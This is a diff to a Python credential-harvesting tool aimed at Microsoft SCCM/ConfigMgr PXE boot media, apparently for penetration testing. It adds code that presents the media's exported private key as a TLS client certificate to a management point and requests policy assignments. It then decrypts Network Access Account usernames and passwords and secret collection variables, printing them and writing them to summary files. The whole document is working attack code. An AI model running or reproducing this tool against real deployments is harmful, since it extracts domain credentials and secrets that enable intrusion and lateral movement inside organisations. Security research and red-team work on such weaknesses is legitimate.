@@ -9,7 +9,7 @@ import requests
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from requests_toolbelt.multipart.decoder import MultipartDecoder
 
-from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding, utils
 from cryptography.hazmat.primitives.serialization import pkcs12
 
@@ -289,9 +289,64 @@ class PolicyRetriever:
 
         return plaintext
 
-    def retrieve_policies(self, client_id, output_dir):
+    def _write_client_pem(self, output_dir):
+        """Write the PFX cert + private key as PEM files for requests' TLS client auth."""
+        cert_path = os.path.join(output_dir, "_mp_client_cert.pem")
+        key_path = os.path.join(output_dir, "_mp_client_key.pem")
+        with open(cert_path, "wb") as f:
+            f.write(self.cert.public_bytes(serialization.Encoding.PEM))
+        with open(key_path, "wb") as f:
+            f.write(self.private_key.private_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PrivateFormat.PKCS8,
+                encryption_algorithm=serialization.NoEncryption(),
+            ))
+        os.chmod(key_path, 0o600)
+        return cert_path, key_path
+
+    def _fetch_mp_key_info(self, session, output_dir):
+        """Hit MPKEYINFORMATIONMEDIA and return (x64UnknownMachineGUID, sitecode)."""
+        print(f"[*] Requesting MPKEYINFORMATIONMEDIA from {self.mp_url}...")
+        r = session.get(self.mp_url + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")
+
+        mpkey_path = os.path.join(output_dir, "MPKEYINFORMATIONMEDIA.xml")
+        with open(mpkey_path, "w") as f:
+            f.write(r.text)
+
+        if r.status_code != 200:
+            raise RuntimeError(
+                f"MPKEYINFORMATIONMEDIA HTTP {r.status_code} from {self.mp_url}. "
+                f"Saved response to {mpkey_path}. "
+                f"If MP requires HTTPS / Enhanced HTTP, try --mp https://<MP> instead."
+            )
+
+        try:
+            root = ET.fromstring(r.text)
+        except ET.ParseError as e:
+            snippet = r.text[:300].replace("\n", " ")
+            raise RuntimeError(
+                f"MPKEYINFORMATIONMEDIA response is not valid XML: {e}. "
+                f"Saved to {mpkey_path}. First 300 chars: {snippet!r}"
+            )
+
+        unknown_machines = root.find("UnknownMachines")
+        sitecode_el = root.find("SITECODE")
+        if unknown_machines is None or unknown_machines.get("x64UnknownMachineGUID") is None:
+            child_tags = sorted({el.tag for el in root}) or [root.tag]
+            raise RuntimeError(
+                "MP response is missing <UnknownMachines x64UnknownMachineGUID=...>. "
+                f"Top-level elements seen: {child_tags}. "
+                "Likely causes: (1) 'Allow PXE responses to unknown computers' is disabled on the DP/MP, "
+                "(2) MP requires HTTPS / Enhanced HTTP — try --mp https://<MP>, "
+                f"(3) wrong MP URL. Full response saved to {mpkey_path}."
+            )
+        machine_client_id = unknown_machines.get("x64UnknownMachineGUID")
+        sitecode = sitecode_el.text if sitecode_el is not None else self.site_code
+        return machine_client_id, sitecode
+
+    def retrieve_policies(self, client_id, output_dir, machine_client_id_override=None):
         """Full policy retrieval flow:
-        1. Get MPKEYINFORMATIONMEDIA
+        1. Get MPKEYINFORMATIONMEDIA (skipped if machine_client_id_override given)
         2. Generate auth signatures
         3. Request policy assignments
         4. Download NAAConfig, TaskSequence, CollectionSettings
@@ -306,6 +361,12 @@ class PolicyRetriever:
             urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
         except ImportError:
             pass
+
+        # In HTTPS-only / PKI mode the MP requires TLS client-cert auth.
+        # Present the media PFX as a client cert — same thing real PXE clients do.
+        cert_path, key_path = self._write_client_pem(output_dir)
+        session.cert = (cert_path, key_path)
+        print(f"[*] Using PFX as TLS client cert for MP auth")
 
         # Use the media GUID as CCMClientID
         ccm_client_id = client_id
@@ -322,17 +383,14 @@ class PolicyRetriever:
         data = (ccm_client_id + ';' + ccm_timestamp + "\0").encode("utf-16-le")
         client_token_sig = self._sign_data_sha256(data)
 
-        # Get x64UnknownMachineGUID from MP
-        print(f"[*] Requesting MPKEYINFORMATIONMEDIA from {self.mp_url}...")
-        r = session.get(self.mp_url + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")
-        root = ET.fromstring(r.text)
-        machine_client_id = root.find("UnknownMachines").get("x64UnknownMachineGUID")
-        sitecode = root.find("SITECODE").text
+        # If caller already has the GUID (from variables.xml), skip the MP key call.
+        if machine_client_id_override:
+            machine_client_id = machine_client_id_override
+            sitecode = self.site_code
+            print(f"[*] Using x64UnknownMachineGUID from variables.xml: {machine_client_id} (skipped MPKEYINFORMATIONMEDIA)")
+        else:
+            machine_client_id, sitecode = self._fetch_mp_key_info(session, output_dir)
         print(f"[*] Site code: {sitecode}, x64UnknownMachineGUID: {machine_client_id}")
-
-        # Save MPKEYINFORMATIONMEDIA
-        with open(os.path.join(output_dir, "MPKEYINFORMATIONMEDIA.xml"), "w") as f:
-            f.write(r.text)
 
         # Build policy request payloads
         first_payload = b'\xFF\xFE' + (
@@ -371,6 +429,19 @@ class PolicyRetriever:
             data=me,
             headers={'Content-Type': me.content_type.replace("form-data", "mixed")}
         )
+
+        # Save raw response so we can inspect failures
+        reply_path = os.path.join(output_dir, "PolicyAssignmentsResponse.raw")
+        with open(reply_path, "wb") as f:
+            f.write(r.content)
+        resp_ctype = r.headers.get("Content-Type", "")
+        if r.status_code != 200 or "multipart" not in resp_ctype.lower():
+            snippet = r.content[:400].decode("utf-8", errors="replace").replace("\n", " ")
+            raise RuntimeError(
+                f"Policy assignment request failed: HTTP {r.status_code}, "
+                f"Content-Type={resp_ctype!r}. Saved body to {reply_path}. "
+                f"First 400 chars: {snippet!r}"
+            )
 
         multipart_data = MultipartDecoder.from_response(r)
 
@@ -424,6 +495,7 @@ class PolicyRetriever:
 
         # Process NAA configs
         print("\n[*] Processing Network Access Account Configuration...")
+        naa_creds = []
         for resp in results["naa"]:
             try:
                 # Try plaintext first (HTTPS case)
@@ -440,7 +512,7 @@ class PolicyRetriever:
                 with open(os.path.join(output_dir, "NAAConfig.xml"), "w") as f:
                     f.write(naa_xml)
 
-                self._process_naa_xml(naa_xml)
+                naa_creds.extend(self._process_naa_xml(naa_xml))
             except Exception as e:
                 print(f"[!] Failed to process NAA config: {e}")
                 # Save raw response for manual analysis
@@ -477,6 +549,7 @@ class PolicyRetriever:
 
         # Process Collection Settings
         print("\n[*] Processing Collection Settings...")
+        col_vars = []
         for resp in results["col"]:
             try:
                 try:
@@ -506,9 +579,12 @@ class PolicyRetriever:
                         var_secret = self._deobfuscate_credential_string(val_el.text)
                         var_secret = var_secret[:var_secret.rfind('\x00')] if '\x00' in var_secret else var_secret
                         print(f"[!] Collection Variable: '{var_name}' = '{var_secret}'")
+                        col_vars.append((var_name, var_secret))
             except Exception as e:
                 print(f"[!] Failed to process Collection Settings: {e}")
 
+        self._write_naa_credentials(naa_creds, output_dir)
+        self._write_collection_variables(col_vars, output_dir)
         if credential_hits:
             summary_path = os.path.join(output_dir, "task_sequence_credentials.txt")
             with open(summary_path, "w") as f:
@@ -523,8 +599,12 @@ class PolicyRetriever:
             print(f"[*] Wrote task sequence credential summary to {summary_path}")
 
     def _process_naa_xml(self, naa_xml):
-        """Extract NAA credentials from policy XML."""
+        """Extract NAA credentials from policy XML.
+
+        Returns list of (username, password) tuples; either may be None if missing.
+        """
         root = ET.fromstring(naa_xml)
+        results = []
 
         # Look for CCM_NetworkAccessAccount instances
         for instance in root.iter("instance"):
@@ -533,6 +613,8 @@ class PolicyRetriever:
                 username_el = instance.find(".//*[@name='NetworkAccessUsername']/value")
                 password_el = instance.find(".//*[@name='NetworkAccessPassword']/value")
 
+                username = None
+                password = None
                 if username_el is not None and username_el.text:
                     username = self._deobfuscate_credential_string(username_el.text)
                     username = username[:username.rfind('\x00')] if '\x00' in username else username
@@ -542,6 +624,30 @@ class PolicyRetriever:
                     password = self._deobfuscate_credential_string(password_el.text)
                     password = password[:password.rfind('\x00')] if '\x00' in password else password
                     print(f"[!] Network Access Account Password: '{password}'")
+
+                if username or password:
+                    results.append((username, password))
+        return results
+
+    def _write_naa_credentials(self, naa_creds, output_dir):
+        if not naa_creds:
+            return
+        path = os.path.join(output_dir, "naa_credentials.txt")
+        with open(path, "w") as f:
+            for i, (u, p) in enumerate(naa_creds):
+                f.write(f"NAA Instance {i}\n")
+                f.write(f"  Username: {u if u is not None else '(empty)'}\n")
+                f.write(f"  Password: {p if p is not None else '(empty)'}\n\n")
+        print(f"[*] Wrote NAA credential summary to {path}")
+
+    def _write_collection_variables(self, col_vars, output_dir):
+        if not col_vars:
+            return
+        path = os.path.join(output_dir, "collection_variables.txt")
+        with open(path, "w") as f:
+            for name, value in col_vars:
+                f.write(f"{name} = {value}\n")
+        print(f"[*] Wrote collection variables to {path}")
 
     def _process_task_sequence_xml(self, ts_xml, output_dir):
         """Extract credentials from task sequence policies.
@@ -682,6 +788,7 @@ class PolicyRetriever:
 
         # NAAConfig
         naa_raw = os.path.join(input_dir, "NAAConfig.raw")
+        naa_creds = []
         if os.path.exists(naa_raw):
             try:
                 print(f"[*] Decrypting local NAAConfig: {naa_raw}")
@@ -693,7 +800,7 @@ class PolicyRetriever:
                 with open(naa_out, "w") as f:
                     f.write(naa_xml)
                 print(f"[*] Wrote {naa_out}")
-                self._process_naa_xml(naa_xml)
+                naa_creds.extend(self._process_naa_xml(naa_xml))
             except Exception as e:
                 print(f"[!] Failed to process local NAAConfig.raw: {e}")
         else:
@@ -725,6 +832,7 @@ class PolicyRetriever:
 
         # CollectionSettings
         col_raw = os.path.join(input_dir, "CollectionSettings.raw")
+        col_vars = []
         if os.path.exists(col_raw):
             try:
                 print(f"[*] Decrypting local CollectionSettings: {col_raw}")
@@ -751,9 +859,12 @@ class PolicyRetriever:
                         var_secret = self._deobfuscate_credential_string(val_el.text)
                         var_secret = var_secret[:var_secret.rfind('\x00')] if '\x00' in var_secret else var_secret
                         print(f"[!] Collection Variable: '{var_name}' = '{var_secret}'")
+                        col_vars.append((var_name, var_secret))
             except Exception as e:
                 print(f"[!] Failed to process local CollectionSettings.raw: {e}")
 
+        self._write_naa_credentials(naa_creds, output_dir)
+        self._write_collection_variables(col_vars, output_dir)
         if credential_hits:
             summary_path = os.path.join(output_dir, "task_sequence_credentials.txt")
             with open(summary_path, "w") as f:
